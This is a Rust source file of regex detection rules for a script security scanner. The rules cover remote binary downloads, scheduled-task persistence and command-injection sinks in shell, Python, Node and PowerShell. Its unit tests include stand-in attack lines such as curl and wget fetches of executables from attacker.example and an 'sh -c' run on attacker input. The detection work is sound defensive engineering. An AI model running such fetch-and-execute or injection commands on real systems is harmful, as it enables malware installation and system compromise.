use regex::Regex;
use std::sync::LazyLock;

pub(super) static REMOTE_BINARY_PATTERNS: LazyLock<Vec<(&'static str, Regex)>> =
    LazyLock::new(|| {
        vec![
            (
                "SCRIPT_REMOTE_BINARY_DOWNLOAD",
                // `\b` anchors prevent substring hits inside unrelated
                // tokens like `mycurl`, `securl-helper`, `awget-utility`.
                Regex::new(
                    r"(?i)\b(curl|wget)\b.*(\.sh|\.ps1|\.py|\.js|\.exe|\.pkg|\.dmg|\.deb|\.rpm)",
                )
                .expect("valid regex: remote binary download"),
            ),
            (
                "SCRIPT_POWERSHELL_REMOTE_DOWNLOAD",
                Regex::new("(?i)invoke-webrequest.+(\\.ps1|\\.exe|\\.zip)")
                    .expect("valid regex: powershell remote download"),
            ),
        ]
    });

pub(super) static DEFERRED_PATTERNS: LazyLock<Vec<(&'static str, Regex)>> = LazyLock::new(|| {
    vec![
        (
            "SCRIPT_DEFERRED_EXECUTION",
            Regex::new("(?i)(crontab|schtasks|at\\s+\\d|systemd-run|launchctl\\s+load)")
                .expect("valid regex: deferred execution"),
        ),
        (
            "SCRIPT_PERSISTENCE",
            Regex::new("(?i)(/etc/cron|~/\\.config/autostart|launchagents|startup\\\\|runonce)")
                .expect("valid regex: persistence"),
        ),
    ]
});

pub(super) static SHELL_INJECTION_PATTERNS: LazyLock<Vec<(&'static str, Regex)>> = LazyLock::new(
    || {
        vec![
            (
                "COMMAND_INJECTION_SINK_SHELL",
                // `\b` prevents substring hits inside unrelated tokens like
                // `rebash`, `nashbash`, `myash` — pre-fix any string ending
                // in `bash` or `sh` followed by ` -c $VAR` matched.
                Regex::new(r#"(?i)\b(bash|sh)\s+-c\s+["']?\$[A-Za-z_][A-Za-z0-9_]*"#)
                    .expect("valid regex: shell command injection"),
            ),
            (
                "UNSAFE_USER_CONTROLLED_EXEC_SHELL",
                Regex::new(r#"(?i)(curl|wget)[^\n]{0,180}(\$[1-9]|\$\{?[A-Za-z_]*(INPUT|USER_INPUT|CMD|COMMAND|ARGS?|REQUEST_URL|TARGET_URL)\}?)"#)
                    .expect("valid regex: shell unsafe user exec"),
            ),
        ]
    },
);

pub(super) static PYTHON_INJECTION_PATTERNS: LazyLock<Vec<(&'static str, Regex)>> =
    LazyLock::new(|| {
        vec![
            (
                "COMMAND_INJECTION_SINK_PYTHON",
                Regex::new(r#"(?i)subprocess\.(run|popen|call)\([^)]*shell\s*=\s*true"#)
                    .expect("valid regex: python command injection"),
            ),
            (
                "UNSAFE_USER_CONTROLLED_EXEC_PYTHON",
                Regex::new(r#"(?i)os\.system\(f?["'][^"']*\{[A-Za-z_][A-Za-z0-9_]*\}"#)
                    .expect("valid regex: python unsafe user exec"),
            ),
        ]
    });

pub(super) static NODE_INJECTION_PATTERNS: LazyLock<Vec<(&'static str, Regex)>> = LazyLock::new(
    || {
        vec![
            (
                "COMMAND_INJECTION_SINK_NODE",
                Regex::new(r#"(?i)child_process\.(exec|spawn)\([^)]*(req\.|process\.argv|userInput|input|cmd|command)"#)
                    .expect("valid regex: node command injection"),
            ),
            (
                "UNSAFE_USER_CONTROLLED_EXEC_NODE",
                Regex::new(r#"(?i)child_process\.(exec|spawn)\([^)]*(req\.|process\.argv|userInput|input)"#)
                    .expect("valid regex: node unsafe user exec"),
            ),
        ]
    },
);

pub(super) static POWERSHELL_INJECTION_PATTERNS: LazyLock<Vec<(&'static str, Regex)>> =
    LazyLock::new(|| {
        vec![
            (
                // Accepts the cmdlet `Invoke-Expression` AND its alias `iex`,
                // followed by ANY of the three idiomatic argument-binding
                // shapes — whitespace, parenthesis, or a string-quote
                // delimiter (`"`/`'`) — before the `$variable`. Pre-fix
                // only `\s+` was accepted, so `Invoke-Expression($cmd)`
                // (paren without space) and `iex($cmd)` evaded detection
                // entirely. `\b` anchors prevent substring hits inside
                // unrelated tokens like `apex`, `complex`, `vertex`.
                "COMMAND_INJECTION_SINK_POWERSHELL",
                Regex::new(r#"(?i)\b(invoke-expression|iex)\b[\s("']*\$[A-Za-z_][A-Za-z0-9_]*"#)
                    .expect("valid regex: powershell command injection"),
            ),
            (
                "UNSAFE_USER_CONTROLLED_EXEC_POWERSHELL",
                Regex::new(r#"(?i)\bstart-process\b[\s("']*\$[A-Za-z_][A-Za-z0-9_]*"#)
                    .expect("valid regex: powershell unsafe user exec"),
            ),
        ]
    });

#[cfg(test)]
mod tests {
    use super::*;

    fn matches(patterns: &[(&'static str, Regex)], rule_id: &str, input: &str) -> bool {
        patterns
            .iter()
            .find(|(id, _)| *id == rule_id)
            .map(|(_, re)| re.is_match(input))
            .unwrap_or(false)
    }

    /// Contract: `SCRIPT_REMOTE_BINARY_DOWNLOAD` matches real `curl`/`wget`
    /// invocations followed by an executable URL, but MUST NOT match
    /// substrings like `mycurl`, `securl`, `awget`. Pre-fix the regex had
    /// no `\b` anchor so any token ending in `curl`/`wget` matched.
    #[test]
    fn remote_binary_download_requires_word_boundary() {
        assert!(matches(
            &REMOTE_BINARY_PATTERNS,
            "SCRIPT_REMOTE_BINARY_DOWNLOAD",
            "curl https://attacker.example/x.exe",
        ));
        assert!(matches(
            &REMOTE_BINARY_PATTERNS,
            "SCRIPT_REMOTE_BINARY_DOWNLOAD",
            "wget https://attacker.example/x.sh",
        ));
        assert!(
            !matches(
                &REMOTE_BINARY_PATTERNS,
                "SCRIPT_REMOTE_BINARY_DOWNLOAD",
                "mycurl http://benign.example/x.exe",
            ),
            "`mycurl` is not a real curl invocation; must not match",
        );
        assert!(
            !matches(
                &REMOTE_BINARY_PATTERNS,
                "SCRIPT_REMOTE_BINARY_DOWNLOAD",
                "securl-helper http://benign.example/x.sh",
            ),
            "`securl-helper` is a substring; must not match",
        );
        assert!(
            !matches(
                &REMOTE_BINARY_PATTERNS,
                "SCRIPT_REMOTE_BINARY_DOWNLOAD",
                "awget-utility http://benign.example/x.deb",
            ),
            "`awget-utility` is a substring; must not match",
        );
    }

    /// Contract: `COMMAND_INJECTION_SINK_SHELL` matches genuine `bash -c`
    /// or `sh -c` followed by a `$VAR` injection, but MUST NOT match
    /// substring prefixes like `rebash`, `nashbash`, `myash`.
    #[test]
    fn shell_command_injection_requires_word_boundary() {
        assert!(matches(
            &SHELL_INJECTION_PATTERNS,
            "COMMAND_INJECTION_SINK_SHELL",
            "bash -c $USER_CMD",
        ));
        assert!(matches(
            &SHELL_INJECTION_PATTERNS,
            "COMMAND_INJECTION_SINK_SHELL",
            "sh -c \"$ATTACKER_INPUT\"",
        ));
        assert!(
            !matches(
                &SHELL_INJECTION_PATTERNS,
                "COMMAND_INJECTION_SINK_SHELL",
                "rebash -c $X",
            ),
            "`rebash` is a substring; must not match",
        );
        assert!(
            !matches(
                &SHELL_INJECTION_PATTERNS,
                "COMMAND_INJECTION_SINK_SHELL",
                "nashbash -c $X",
            ),
            "`nashbash` is a substring; must not match",
        );
    }
}
